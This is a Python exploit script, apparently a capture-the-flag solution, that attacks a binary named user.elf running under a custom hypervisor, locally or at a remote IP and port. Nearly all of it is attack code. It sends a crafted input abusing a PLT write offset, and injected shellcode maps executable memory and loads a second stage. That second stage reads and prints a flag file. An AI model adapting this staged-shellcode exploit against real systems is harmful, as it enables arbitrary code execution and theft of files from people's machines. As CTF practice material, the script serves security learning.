#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './user.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':'./hypervisor.elf kernel.bin ld.so.2'.split()+[bin_file]}, \
                        remote  = {'host':'35.200.23.198', 'port':31733})
env.select()

#==========

binf = ELF(bin_file)
offset_plt_write    = binf.plt['write']
offset_s            = 0x2030a4
addr_buf            = 0x400000

#==========

def attack(conn):
    shellasm  = shellcraft.mmap(addr_buf, 0x1000, 'PROT_READ | PROT_WRITE | PROT_EXEC', 'MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED', -1, 0)
    shellasm  = '\n'.join(shellasm.split('\n')[:-4])
    shellasm += '''
    push SYS_mmap-1
    pop rax
    inc rax
    syscall
    '''
    shellasm += shellcraft.read('STDIN_FILENO', addr_buf, 0x1000)
    shellasm += '''
    mov rax, {}
    jmp rax
    '''.format(addr_buf)

    exploit  = '30_\\@{}+@@,'.format((offset_s + 0x10) - (offset_plt_write + 6)).ljust(0x10, '\x90')
    exploit += asm(shellasm)
    conn.sendlineafter('down.\n', exploit)

    shellasm  = shellcraft.open('flag', constants.O_RDONLY)
    shellasm += 'mov edx, eax'
    shellasm += shellcraft.read('edx', addr_buf+0x500, 0x500)
    shellasm += shellcraft.write('STDOUT_FILENO', addr_buf+0x500, 'eax')
    shellcode_st2 = asm(shellasm)
    conn.send(shellcode_st2)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
